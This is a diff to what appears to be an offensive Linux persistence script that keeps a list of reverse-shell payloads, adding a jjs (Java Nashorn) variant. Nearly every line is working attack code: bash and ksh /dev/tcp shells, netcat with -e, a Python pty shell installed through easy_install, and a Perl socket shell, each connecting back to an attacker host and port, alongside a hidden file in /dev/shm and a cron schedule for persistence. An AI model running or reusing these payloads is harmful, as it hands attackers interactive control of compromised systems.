@@ -10,6 +10,7 @@ attackBox=0.0.0.0
 attackPort=5253
 cron="* * * * *"
 EZID=$(mktemp -d)
+JJSFILE=$(mktemp)
 
 touch /dev/shm/.linpay
 
@@ -21,6 +22,7 @@ methods=(
 	# payload = just the bare minimum to run the reverse shell, the extra needed to install the payload somewhere (e.g. cron schedule) is handled in "doors"
 	"bash , bash -c 'exit' , bash -c 'bash -i > /dev/tcp/$attackBox/$attackPort 2>&1 0>&1':"
 	"easy_install , echo 'import sys,socket,os,pty;exit()' > $EZID/setup.py; easy_install $EZID 2> /dev/null &> /dev/null , echo 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"attackPort\"),int(os.getenv(\"attackBox\"))))[os.dup2(s.fileno(),fd) for fd in (0,1,2)]pty.spawn(\"$SHELL\")' > $EZID/setup.py; easy_install $EZID:"
+	"jjs , echo \"quit()\" > $JJSFILE; jjs $JJSFILE , echo 'var host=Java.type(\"java.lang.System\").getenv(\"RHOST\");var port=Java.type(\"java.lang.System\").getenv(\"RPORT\");var ProcessBuilder = Java.type(\"java.lang.ProcessBuilder\");var p=new ProcessBuilder(\"$SHELL\", \"-i\").redirectErrorStream(true).start();var Socket = Java.type(\"java.net.Socket\");var s=new Socket(host,port);var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type(\"java.lang.Thread\").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs" 
 	"ksh , ksh -c 'exit' , ksh -c 'ksh -i > /dev/tcp/$attackBox/$attackPort 2>&1 0>&1':"
 	"nc , $(nc -w 1 -lnvp 5253 &> /dev/null & nc 0.0.0.0 5253 &> /dev/null) , nc $attackBox $attackPort -e $SHELL:"
 	"perl , perl -e \"use Socket;\" , perl -e 'use Socket;$i=\"$ENV{attackBox}\";$p=$ENV{attackPort};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"$SHELL -i\");};'" 
